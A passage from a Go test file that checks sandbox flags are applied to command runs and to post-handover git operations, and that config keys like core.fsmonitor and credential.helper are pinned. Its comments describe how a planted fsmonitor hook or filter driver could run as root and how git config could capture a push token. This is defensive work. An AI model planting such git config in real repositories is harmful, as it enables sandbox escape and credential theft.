	for _, f := range []string{"toolchain.go", "steps.go", "engine_qwen.go"} {
		src, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		for i, line := range strings.Split(string(src), "\n") {
			if !strings.Contains(line, "runCmd(ctx, cmdSpec{") {
				continue
			}
			if !strings.Contains(line, "Sandbox: true") {
				t.Errorf("%s:%d runs without the sandbox: %s", f, i+1, strings.TrimSpace(line))
			}
		}
	}
}

// Once grantSandbox hands the clone (its .git/config included) to the sandbox user, that user's
// own code can write .git/config. The worker's own git — stage, diff, commit, push — must then
// run as the sandbox user too: otherwise a planted core.fsmonitor or filter driver executes as
// root on the next `git status`/`git add`, which is a sandbox escape. A source check, for the
// same reason the test above is one — there is no sandbox user on a developer's laptop. It pins
// that git() carries the flag, that the run turns it on after the handover, and that gitPins
// neutralises the config keys that would otherwise capture the token on a networked push.
func TestPostHandoverGitRunsAsTheSandboxUser(t *testing.T) {
	git, err := os.ReadFile("git.go")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(git), "Sandbox: g.sandbox") {
		t.Error("git.go: git() must pass Sandbox: g.sandbox, or post-handover git runs as root over a sandbox-writable .git")
	}
	run, err := os.ReadFile("run.go")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(run), "repo.sandbox = true") {
		t.Error("run.go: nothing flips repo.sandbox after grantSandbox, so stage/commit/push would run as root")
	}
	for _, k := range []string{"core.fsmonitor=", "credential.helper=", "http.sslVerify=true"} {
		if !strings.Contains(string(git), k) {
			t.Errorf("gitPins no longer neutralises %q on the command line", k)
		}
	}
}
